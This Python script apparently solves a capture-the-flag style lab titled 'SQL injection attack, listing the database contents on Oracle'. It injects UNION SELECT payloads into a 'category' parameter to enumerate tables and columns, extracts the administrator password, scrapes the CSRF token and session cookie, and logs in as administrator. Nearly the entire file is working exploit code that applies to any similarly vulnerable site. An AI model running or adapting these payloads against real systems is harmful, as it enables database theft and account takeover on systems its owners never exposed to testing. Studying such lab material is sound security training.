"""
  Lab: SQL injection attack, listing the database contents on Oracle

  Steps:
  1. Inject payload into 'category' query parameter to retrieve the name of users table
  2. Adjust the payload to retrieve the names of username and password columns
  3. Adjust the payload to retrieve the administrator password
  4. Fetch the login page
  5. Extract the csrf token and session cookie
  6. Login as the administrator
  7. Fetch the administrator profile

  Author: N00BCYB0T
"""
import argparse
import requests
from colorama import Fore
import re
from urllib3.exceptions import InsecureRequestWarning

requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)

def main():
    parser = argparse.ArgumentParser()
    parser.add_argument('-u', "--url", required=True, help='Target URL')
    parser.add_argument('--proxy', help='Proxy URL (e.g., http://127.0.0.1:8080)')
    args = parser.parse_args()

    # Configure session with proxy if provided
    session = requests.session()
    if args.proxy:
        proxies = {
            "http": args.proxy,
            "https": args.proxy
        }
        session.proxies = proxies
    session.verify = False

    print("⦗#⦘ Injection parameter: " + Fore.YELLOW + "category")
    print(Fore.WHITE + "⦗1⦘ Injecting a payload to retrieve the name of users table.. ", end="", flush=True)

    payload = "' union SELECT table_name, null from all_tables-- -"
    injection = fetch(f"/filter?category={payload}", session, args.url)
    users_table = re.findall("<th>(USERS_.*)</th>", injection.text)[0]

    print(Fore.GREEN + "OK"  + Fore.WHITE + " => " + Fore.YELLOW + users_table)
    print(Fore.WHITE + "⦗2⦘ Adjusting the payload to retrieve the names of username and password columns.. ", end="", flush=True)

    payload = f"' union SELECT column_name, null from all_tab_columns where table_name = '{users_table}'-- -"
    injection = fetch(f"/filter?category={payload}", session, args.url)
    username_column = re.findall("<th>(USERNAME_.*)</th>", injection.text)[0]
    password_column = re.findall("<th>(PASSWORD_.*)</th>", injection.text)[0]
    
    print(Fore.GREEN + "OK" + Fore.WHITE + " => " + Fore.YELLOW + username_column + " | " + password_column)
    print(Fore.WHITE + "⦗3⦘ Adjusting the payload to retrieve the administrator password.. ", end="", flush=True)

    payload = f"' union SELECT {username_column}, {password_column} from {users_table} where {username_column} = 'administrator'-- -"
    injection = fetch(f"/filter?category={payload}", session, args.url)
    admin_password = re.findall("<td>(.*)</td>", injection.text)[0]

    print(Fore.GREEN + "OK" + Fore.WHITE + " => " + Fore.YELLOW + admin_password)
    print(Fore.WHITE + "⦗4⦘ Fetching the login page.. ", end="", flush=True)

    login_page = fetch("/login", session, args.url)

    print(Fore.GREEN + "OK")
    print(Fore.WHITE + "⦗5⦘ Extracting the csrf token and session cookie.. ", end="", flush=True)
    
    session_cookie = login_page.cookies.get("session")
    csrf_token = re.findall("csrf.+value=\"(.+)\"", login_page.text)[0]

    print(Fore.GREEN + "OK")
    print(Fore.WHITE + "⦗6⦘ Logging in as the administrator.. ", end="", flush=True)

    data = { "username": "administrator", "password": admin_password, "csrf": csrf_token }
    cookies = { "session": session_cookie }
    admin_login = post_data("/login", data, cookies, session, args.url)

    print(Fore.GREEN + "OK")
    print(Fore.WHITE + "⦗7⦘ Fetching the administrator profile.. ", end="", flush=True)

    admin_session = admin_login.cookies.get("session")
    cookies = { "session": admin_session }
    fetch("/my-account", session, args.url, cookies)

    print(Fore.GREEN + "OK")
    print(Fore.WHITE + "🗹 The lab should be marked now as " + Fore.GREEN + "solved")


def fetch(path, session, url, cookies = None):
    try:  
        return session.get(f"{url}{path}", cookies=cookies, allow_redirects=False)
    except:
        print(Fore.RED + "⦗!⦘ Failed to fetch " + path + " through exception")
        exit(1)


def post_data(path, data, cookies, session, url):
    try:    
        return session.post(f"{url}{path}", data, cookies=cookies, allow_redirects=False)
    except:
        print(Fore.RED + "⦗!⦘ Failed to post data to " + path + " through exception")
        exit(1)


if __name__ == "__main__":
    main()